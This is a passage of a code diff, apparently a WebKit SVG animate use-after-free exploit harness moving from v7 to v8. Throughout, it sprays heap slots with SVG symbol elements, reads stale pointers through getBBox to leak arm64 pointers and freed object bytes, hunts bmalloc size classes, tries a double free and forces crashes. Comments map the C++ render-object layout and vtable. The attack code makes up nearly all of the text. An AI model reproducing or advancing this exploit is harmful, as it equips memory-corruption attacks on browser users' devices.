-        useEl.remove();void document.body.offsetHeight;
-        // Spray into SECOND freed render slot
-        const svgS=mkSVGHost();const spray=[];
-        for(let i=0;i<512;i++){
-            const sym=document.createElementNS(SVG_NS,'symbol');
-            sym.setAttribute('id',`ud_s_${t}_${i}`);
-            sym.setAttribute('viewBox','0 0 100 100');
-            const r=document.createElementNS(SVG_NS,'rect');
-            r.setAttribute('x','99');r.setAttribute('y','99');
-            r.setAttribute('width','1');r.setAttribute('height','1');
-            sym.appendChild(r);svgS.appendChild(sym);spray.push(sym);
-        }
-        await yield_();
-        // Third re-add — reads stale ptr → our spray (hopefully)
-        svg.appendChild(useEl);void document.body.offsetHeight;
-        let bb=null;
-        try{bb=useEl.getBBox();}catch(e){log(`  [CRASH] t${t}: ${e}`,'hi');}
-        if(bb){
-            const w=bb.width,h=bb.height;
-            const baseline=Math.abs(w-bbBefore.width)<0.5;
-            const zero=w===0&&h===0;
-            const u=f2u(w);const ptr=isPtrLike(u)&&u!==0;
-            if(ptr)log(`  [PTR!] t${t}: ${f2h(w)}/${f2h(h)} — arm64 ptr!`,'hi');
-            else if(!baseline&&!zero)log(`  [DIFF!] t${t}: was=${bbBefore.width.toFixed(1)} now=${w.toFixed(4)}(${f2h(w)})`,'ok');
-            else if(t<4)log(`  t${t}: ${zero?'0':'baseline'} w=${w.toFixed(3)}`,'dim');
-        }
-        for(const s of spray)s.remove();spray.length=0;
-        svgS.remove();sym1.remove();sym2.remove();svg.remove();await yield_();
-    }
-    if(!q)dis(false);
-}
-
-// ── UV: vtable read probe ─────────────────────────────────────────────
-// RenderSVGSymbol C++ obj layout (arm64, little-endian):
-//   [0x000] vtable ptr (8B) — pointer to vtable, PAC'd on arm64e
-//   [0x008] m_node ptr (8B) — pointer back to SVGSymbolElement DOM node
-//   [0x010] m_parent ptr (8B) — pointer to parent render object
-//   [0x018] m_firstChild (8B)
-//   [0x020] m_lastChild (8B)
-//   [0x028] m_nextSibling (8B)
-//   [0x030] m_prevSibling (8B)
-//   [0x038] transform matrix (6×4B = 24B)
-//   [0x050] overflow rect (4×4B = 16B)
-//   [0x060] cached bbox (4×4B = 16B)  ← THIS is what getBBox reads
-//   ...
-//
-// getBBox reads the CACHED BBOX field (~0x60 offset) when render is alive.
-// When render is FREED, the stale ptr reads whatever is at 0x60 in the freed chunk.
-// If bmalloc places a free-list next ptr there → we read it as floats → ptr decode.
-// bmalloc free list: freed chunks store next ptr at offset 0 (first 8 bytes).
-// So reading offset 0x60 in a freed chunk: bmalloc likely has zero there (cleared on free),
-// OR the allocator metadata / a following allocation's header.
-//
-// GOAL: force getBBox to read at DIFFERENT OFFSETS than 0x60.
-// Method: vary the render coordinate frame such that the GEOMETRIC COMPUTATION
-// reads from a different cached field within the render object.
-// Tests: getCTM(), getScreenCTM(), SVGRect.x/y/width/height directly.
-async function runUV(q=false){
-    if(!q){dis(true);sep();log('▶ UV: vtable / render obj field scan via stale ptr','inf');sep();}
-    log('[*] after render freed (useEl re-attach), try reading different fields','inf');
-    log('[*] getBBox → cached bbox at ~0x60; getCTM → transform at ~0x38','inf');
-    log('[*] any non-zero non-geometry value from freed render obj = raw bytes','inf');
-    log('');
+    let hit=0,crash=0;
     for(let t=0;t<12;t++){
-        const{svg,useEl,sym1,sym2,cached}=await setupUAF(`uv_${t}`);
-        if(!cached){continue;}
-        // Free the render obj via useEl removal
-        useEl.remove();void document.body.offsetHeight;await yield_();
+        const{svg,useEl,sym1,sym2,cached}=await setup(`db_${t}`);
+        if(!cached)continue;
+        void useEl.getBBox(); // verify cached
+        // Double remove — simultaneous, no yield between
+        sym1.remove();
+        useEl.remove();
+        // NO yield — both freed, now spray both size classes
+        const svgSp=mkSVGHost();const spray=[];
+        for(let i=0;i<2048;i++){const s=mkSpraySym(`db_${t}_${i}`);svgSp.appendChild(s);spray.push(s);}
+        // Re-add useEl only (sym1 stays removed → animation ptr now truly dangling)
         svg.appendChild(useEl);
-        // Read via multiple methods before layout forces re-creation
-        let results={};
-        try{const bb=useEl.getBBox();results.getBBox={w:bb.width,h:bb.height};}catch(e){results.getBBox='CRASH:'+e;}
-        try{const cr=useEl.getClientRects();results.getClientRects=cr[0]?{w:cr[0].width,h:cr[0].height}:null;}catch(e){results.getClientRects='CRASH:'+e;}
-        try{const bcr=useEl.getBoundingClientRect();results.getBCR={w:bcr.width,h:bcr.height};}catch(e){results.getBCR='CRASH:'+e;}
-        try{
-            // SVGElement.getBBox() with options (non-standard but WebKit sometimes supports)
-            const bb2=useEl.getBBox({stroke:true,markers:true,clipped:true});
-            results.getBBox_opts={w:bb2.width,h:bb2.height};
-        }catch(e){results.getBBox_opts='n/a';}
-        // Check for anything interesting (non-zero, non-baseline)
-        let interesting=false;
-        for(const[k,v]of Object.entries(results)){
-            if(typeof v==='object'&&v!==null){
-                const w=v.w||0;const u=f2u(w);
-                if(isPtrLike(u)&&u!==0){log(`  [PTR!] t${t} ${k}: ${f2h(w)}`,'hi');interesting=true;}
-                else if(w!==0&&Math.abs(w-150)>1){log(`  [RAW] t${t} ${k}: w=${w.toFixed(4)}(${f2h(w)})`,'ok');interesting=true;}
-            }else if(typeof v==='string'&&v.startsWith('CRASH')){
-                log(`  [CRASH] t${t} ${k}: ${v}`,'hi');interesting=true;
-            }
+        // Tight read
+        for(let p=0;p<15;p++){
+            try{
+                const bb=useEl.getBBox();const w=bb.width;
+                const isA=Math.abs(w-198)<0.5;
+                const isB=Math.abs(w-100)<0.5;
+                if(isA||isB){log(`  [HIT!] t${t} p=${p}: w=${w} sentinel read!`,'ok');hit++;break;}
+                const u=f2u(w);
+                if(isPtrLike(u)){log(`  [PTR!] t${t} p=${p}: ${f2h(w)} arm64 ptr in freed obj!`,'hi');hit++;break;}
+                if(w!==0&&Math.abs(w-150)>1&&Math.abs(w-180)>1){
+                    log(`  [WILD!] t${t} p=${p}: ${w.toFixed(4)}(${f2h(w)})`,'hi');hit++;break;
+                }
+                if(t<4&&p<5)log(`  t${t} p=${p}: ${w.toFixed(3)}`,'dim');
+            }catch(e){log(`  [CRASH] t${t} p=${p}: ${e}`,'hi');crash++;break;}
         }
-        if(!interesting&&t<3)log(`  t${t}: getBBox=${results.getBBox?.w?.toFixed(1)||'err'} bcr=${results.getBCR?.w?.toFixed(1)||'err'}`,'dim');
-        sym1.remove();sym2.remove();svg.remove();await yield_();
+        for(const s of spray)s.remove();spray.length=0;svgSp.remove();
+        sym2.remove();svg.remove();await yield_();
+    }
+    log(`\n[*] DB: hits=${hit} crashes=${crash}`,(hit>0?'ok':'dim'));
+    if(!q)dis(false);return{hit,crash};
+}
+
+// ── SZ: size class hunt — find the exact bmalloc size class for SVGSymbolElement ─
+// Spray objects of different sizes, see which one produces non-baseline getBBox
+// after sym1 removal. The matching size class = sym1's freed slot captured.
+async function runSZ(q=false){
+    if(!q){dis(true);sep();log('▶ SZ: size class hunt — find exact freed slot size for SVGSymbolElement','inf');sep();}
+    log('[*] testing size classes: 256, 320, 384, 448, 512 bytes','inf');
+    log('[*] strategy: pad DOM nodes with attributes to hit each size class','inf');
+    log('[*] sentinel geometry 198 expected on correct size class','inf');
+    log('');
+    // Create DOM elements of known sizes using attribute padding
+    // SVG elements with N attributes of length L add roughly N*(L+overhead) to C++ obj
+    // Use elements + attributes to tune size
+    const sizeConfigs=[
+        {label:'sz256',attrs:4,attrLen:20},
+        {label:'sz320',attrs:8,attrLen:20},
+        {label:'sz384',attrs:12,attrLen:20},  // target: SVGSymbolElement
+        {label:'sz448',attrs:16,attrLen:20},
+        {label:'sz512',attrs:20,attrLen:20},
+    ];
+    for(const cfg of sizeConfigs){
+        log(`[*] testing ${cfg.label} (${cfg.attrs} attrs × ${cfg.attrLen}B)`,'inf');
+        let hit=0;
+        for(let t=0;t<8;t++){
+            const{svg,useEl,sym1,sym2,cached}=await setup(`sz_${cfg.label}_${t}`);
+            if(!cached)continue;
+            sym1.remove();
+            // Spray with size-tuned elements
+            const svgSp=mkSVGHost();const spray=[];
+            for(let i=0;i<2048;i++){
+                const el=mkSpraySym(`sz_el_${cfg.label}_${t}_${i}`);
+                // Add extra attributes to bump size class
+                for(let a=0;a<cfg.attrs;a++){
+                    el.setAttribute(`data-pad-${a}`,'X'.repeat(cfg.attrLen));
+                }
+                svgSp.appendChild(el);spray.push(el);
+            }
+            for(let p=0;p<10;p++){
+                try{
+                    const bb=useEl.getBBox();const w=bb.width;
+                    if(Math.abs(w-198)<0.5){log(`  [HIT!] ${cfg.label} t=${t} p=${p}: w=198 size class matched!`,'ok');hit++;break;}
+                    if(w!==0&&Math.abs(w-150)>1&&Math.abs(w-180)>1&&isPtrLike(f2u(w))){
+                        log(`  [PTR!] ${cfg.label} t=${t} p=${p}: ${f2h(w)}`,'hi');hit++;break;
+                    }
+                }catch(e){log(`  [CRASH] ${cfg.label} t=${t}: ${e}`,'hi');hit++;break;}
+            }
+            for(const el of spray)el.remove();spray.length=0;svgSp.remove();
+            sym2.remove();svg.remove();await yield_();
+        }
+        log(`  ${cfg.label}: ${hit} hits`,(hit>0?'ok':'dim'));
     }
     if(!q)dis(false);
 }
 
-// ── CRASH ─────────────────────────────────────────────────────────────
-async function runCRASH(){
-    sep();log('▶ CRASH: rapid remove/re-add cycle → force render UAF crash','bad');sep();
-    log('[*] rapidly cycling useEl removal + re-addition to hit freed render obj','dim');
-    const{svg,useEl,sym1,sym2,cached}=await setupUAF('crash');
-    if(!cached){log('[-] animation not cached, aborting','bad');dis(false);return;}
-    log(`[*] initial getBBox: ${useEl.getBBox().width}`,'dim');
-    for(let i=0;i<200;i++){
-        try{
-            useEl.remove();
-            // Immediately read — useEl is detached but may have stale renderer
-            // No layout force here — trying to catch mid-destruction state
-            svg.appendChild(useEl);
-            const bb=useEl.getBBox();
-            const w=bb.width,h=bb.height;
-            const u=f2u(w);
-            if(isPtrLike(u)&&u!==0){
-                log(`  [PTR!] i=${i}: ${f2h(w)}/${f2h(h)}`,'hi');
-            }else if(w!==0&&Math.abs(w-150)>1){
-                log(`  [INTERESTING] i=${i}: ${f2h(w)}/${f2h(h)}`,'ok');
-            }
-            if(i<5||i%50===0)log(`  i=${i}: w=${w.toFixed(3)}`,'dim');
-        }catch(e){
-            log(`  [CRASH] i=${i}: ${e}`,'hi');
-            log('[+] CRASH = UAF in render obj during removal/re-attachment!','ok');
-            break;
+// ── IM: immediate read — no spray, read getBBox 100× immediately after sym1.remove() ─
+// Capture the raw freed SVGSymbolElement content before ANY external allocation
+// At 0ms: bmalloc may have cleared the freed slot (zero fill) or left it dirty
+// This tells us: is the freed slot dirty (contains old C++ data) or zeroed?
+// Also measures: how many reads return 0 vs 150 in the first 100 reads
+async function runIM(q=false){
+    if(!q){dis(true);sep();log('▶ IM: immediate read — 100× getBBox immediately after sym1.remove(), no spray','inf');sep();}
+    log('[*] reading freed SVGSymbolElement content (no spray — raw freed bytes)','inf');
+    log('[*] 0 = ptr field zeroed (bmalloc zeroes on free) or referenceElement returns null','inf');
+    log('[*] 150 = render tree still alive (render obj not freed yet)','inf');
+    log('[*] non-0 non-150 = raw C++ obj data from freed SVGSymbolElement!','inf');
+    log('');
+    const buckets={zero:0,baseline:0,sym2:0,other:0,crash:0};
+    const others=[];
+    for(let t=0;t<12;t++){
+        const{svg,useEl,sym1,sym2,cached}=await setup(`im_${t}`);
+        if(!cached)continue;
+        sym1.remove(); // ← freed, read IMMEDIATELY
+        const reads=[];
+        for(let p=0;p<100;p++){
+            try{
+                const bb=useEl.getBBox();reads.push(bb.width);
+            }catch(e){reads.push(-1);buckets.crash++;break;}
         }
-        if(i%20===19)await yield_();
+        // Classify reads
+        let firstNon150=-1;
+        for(let p=0;p<reads.length;p++){
+            const w=reads[p];
+            if(w<0){buckets.crash++;break;}
+            if(w===0)buckets.zero++;
+            else if(Math.abs(w-150)<0.5)buckets.baseline++;
+            else if(Math.abs(w-180)<0.5)buckets.sym2++;
+            else{buckets.other++;others.push({t,p,w,hex:f2h(w)});if(firstNon150<0)firstNon150=p;}
+        }
+        // Seq summary
+        const seq=reads.slice(0,20).map(w=>{
+            if(w<0)return'X';
+            if(w===0)return'0';
+            if(Math.abs(w-150)<0.5)return'B';
+            if(Math.abs(w-180)<0.5)return'S2';
+            return `?${w.toFixed(0)}`;
+        }).join('');
+        log(`  t${t}: ${seq}${reads.length>20?'...':''}`,
+            firstNon150>=0?'ok':'dim');
+        sym2.remove();svg.remove();await yield_();
     }
-    sym1.remove();sym2.remove();svg.remove();dis(false);
+    log(`\n[*] IM buckets: 0=${buckets.zero} baseline=${buckets.baseline} sym2=${buckets.sym2} other=${buckets.other} crash=${buckets.crash}`,
+        (buckets.other>0||buckets.crash>0?'ok':'inf'));
+    if(others.length>0){
+        log('[+] NON-GEOMETRY VALUES (raw freed bytes?):','ok');
+        for(const o of others.slice(0,10)){
+            log(`  t=${o.t} p=${o.p}: ${o.w.toFixed(4)} (${o.hex})`,'hi');
+        }
+    }
+    if(!q)dis(false);return buckets;
+}
+
+// ── FF: free-fill detect — probe whether bmalloc zeroes freed SVGSymbolElement ─
+// Alloc many SVGSymbolElements, read their identity, free them, read again via stale ptr
+// Tests whether bmalloc zero-fills on free (iOS bmalloc with guard: YES for some sizes)
+// If zero-fill: the ZERO we see in LK/IM is not raw data, it's bmalloc clearing the slot
+// If NOT zero-fill: the ZERO is because the renderer ptr field (m_renderer) is zeroed
+//   by WebKit itself on destruction
+async function runFF(q=false){
+    if(!q){dis(true);sep();log('▶ FF: free-fill — does bmalloc zero-fill freed SVGSymbolElement slots?','inf');sep();}
+    log('[*] alloc sym → spray into it → free sym → read via stale animation ptr','inf');
+    log('[*] sentinel injection: create sym with specific child layout → read back child data','inf');
+    log('[*] child data survives free → bmalloc does NOT zero-fill at this size class','inf');
+    log('[*] child data gone (0) → bmalloc zeroes on free → our spray must be alive data','inf');
+    log('');
+    // We can't inject bytes directly into SVGSymbolElement, but we can vary the GEOMETRY.
+    // If reading 0 after free: either zeroed by bmalloc OR by WebKit DOM destructor.
+    // Test: vary the number of children in sym1 → if IM reads 0 always, the count doesn't matter.
+    // Test: does the viewport scale of the FREED sym affect the 0 or does it stay 0?
+    // Since getBBox computes from render (live) not DOM, and after sym1.remove() render might die:
+    // IM's zeros could be render death, not actual DOM byte reads.
+    // FF tests: re-add sym1 quickly → if render not dead, values come back.
+    for(let t=0;t<8;t++){
+        const{svg,useEl,sym1,sym2,cached}=await setup(`ff_${t}`);
+        if(!cached)continue;
+        sym1.remove(); // freed
+        // read immediately
+        let w0=null;
+        try{w0=useEl.getBBox().width;}catch(e){log(`  t${t}: crash=${e}`,'hi');continue;}
+        // Re-add sym1 quickly (no yield)
+        svg.appendChild(sym1);
+        let w1=null;
+        try{w1=useEl.getBBox().width;}catch(e){log(`  t${t}: crash=${e}`,'hi');continue;}
+        log(`  t${t}: removed=${w0?.toFixed(3)} re-added=${w1?.toFixed(3)}`,
+            (w0!==null&&w1!==null&&Math.abs(w0-150)>1)?'ok':'dim');
+        sym1.remove();sym2.remove();svg.remove();await yield_();
+    }
+    log('[*] if re-added instantly returns 150: render was still alive during removal (render not freed)','inf');
+    log('[*] if re-added returns 0 or new value: render freed and re-created','inf');
+    if(!q)dis(false);
+}
+
+// ── CT: controlled transition — surgically time the spray to the ZERO window ─
+// LK showed: after sym1.remove(), reads 1-2 return 0, read 3 returns 150 (sym2).
+// CT tries to inject between read 1 (zero) and read 3 (sym2 animation cycle).
+// Spray BETWEEN the zero reads → if spray lands → read 3 returns sentinel instead of 150.
+async function runCT(q=false){
+    if(!q){dis(true);sep();log('▶ CT: controlled transition — spray between ZERO reads to intercept animation cycle','inf');sep();}
+    log('[*] read 1 (zero) → spray → read 2 → spray → read 3 (should be 150 but we intercept?)','inf');
+    log('[*] the ZERO→150 transition window is 1 layout pass wide','inf');
+    log('[*] if spray lands in freed slot BEFORE animation resolves sym2 → returns sentinel','inf');
+    log('');
+    let hit=0,crash=0;
+    for(let t=0;t<16;t++){
+        const{svg,useEl,sym1,sym2,cached}=await setup(`ct_${t}`);
+        if(!cached)continue;
+        sym1.remove();
+        let r1=null;
+        try{r1=useEl.getBBox().width;}catch(e){crash++;continue;}
+        // Spray between read 1 and read 2
+        const svgSp=mkSVGHost();const spray=[];
+        for(let i=0;i<2048;i++){const s=mkSpraySym(`ct_${t}_${i}`);svgSp.appendChild(s);spray.push(s);}
+        // Read 2 — did spray land?
+        let r2=null;
+        try{r2=useEl.getBBox().width;}catch(e){crash++;log(`  [CRASH] t=${t} p=2: ${e}`,'hi');
+            for(const s of spray)s.remove();svgSp.remove();sym2.remove();svg.remove();continue;}
+        // Read 3 (this is where LK showed 150 — transition complete)
+        let r3=null;
+        try{r3=useEl.getBBox().width;}catch(e){crash++;}
+        const isHit=(w)=>Math.abs((w||0)-198)<0.5||Math.abs((w||0)-100)<0.5;
+        const label=`${r1?.toFixed(1)||'X'}→${r2?.toFixed(1)||'X'}→${r3?.toFixed(1)||'X'}`;
+        if(isHit(r2)||isHit(r3)){
+            log(`  [HIT!] t=${t}: ${label} — sentinel read between transitions!`,'ok');hit++;
+        }else if((r2!==null&&isInteresting(r2))||(r3!==null&&isInteresting(r3))){
+            log(`  [WILD!] t=${t}: ${label} — non-geometry value!`,'hi');hit++;
+        }else{
+            if(t<6)log(`  t=${t}: ${label}`,'dim');
+        }
+        for(const s of spray)s.remove();spray.length=0;svgSp.remove();
+        sym2.remove();svg.remove();await yield_();
+    }
+    log(`\n[*] CT: hits=${hit} crashes=${crash}`,(hit>0?'ok':'dim'));
+    if(!q)dis(false);return{hit,crash};
 }
 
 // ── RUN ALL ───────────────────────────────────────────────────────────
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG animate UAF v7 — use re-attachment → freed RenderSVGSymbol','inf');sep();
-    log('[*] v6 proved: render obj survives DOM removal, freed only when useEl removed','ok');
-    log('[*] v7 strategy: remove useEl → freed render → spray/read → re-add → stale ptr','inf');log('');
+    log('▶ SVG animate UAF v8 — sym1 removal → ZERO window spray → sentinel read','inf');sep();
+    log('[*] v7 proved: cache survives useEl removal (UR 16/16). Render re-created sync on re-add.','ok');
+    log('[*] v8: remove sym1 (NOT useEl) → SVGSymbolElement freed → stale SVGElement* in anim cache','ok');
+    log('[*] sentinel: spray sym w=99 → getBBox should return 198 if we hit freed slot','ok');log('');
     const R={};
     for(const[lbl,fn]of[
-        ['UR_cache_survival',runUR],
-        ['US_spray_capture',runUS],
-        ['UP_ptr_decode',runUP],
-        ['UD_double_free',runUD],
-        ['UV_vtable_scan',runUV],
+        ['IM_immediate_read',runIM],
+        ['ZW_zero_window_spray',runZW],
+        ['CT_controlled_transition',runCT],
+        ['DB_dual_removal',runDB],
+        ['FF_free_fill_probe',runFF],
+        ['SZ_size_class_hunt',runSZ],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{const r=await fn(true);R[lbl]=r;}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=0;}
         log('');
     }
-    sep();log('▶ SUMMARY v7','inf');sep();
-    log('[*] key: does animation ptr SURVIVE useEl removal? (UR test)','inf');
-    log('[*] key: do any alternate paths return non-geometry values? (UV test)','inf');
-    log('[*] key: does crash occur during rapid cycle? (UD/CRASH test)','inf');
+    sep();log('▶ SUMMARY v8','inf');sep();
+    log('[*] KEY: IM showing non-150/non-0 = raw freed SVGSymbolElement bytes','inf');
+    log('[*] KEY: ZW/CT hitting 198 = controlled geometry leak via stale ptr','inf');
+    log('[*] KEY: any CRASH = raw UAF dereference path confirmed','inf');
     for(const[lbl,r]of Object.entries(R)){
         const has=r&&(typeof r==='object'?Object.values(r).some(v=>v>0):r>0);
         log(`  ${has?'[+]':'[-]'} ${lbl}: ${typeof r==='object'?JSON.stringify(r):r??'—'}`,has?'ok':'dim');
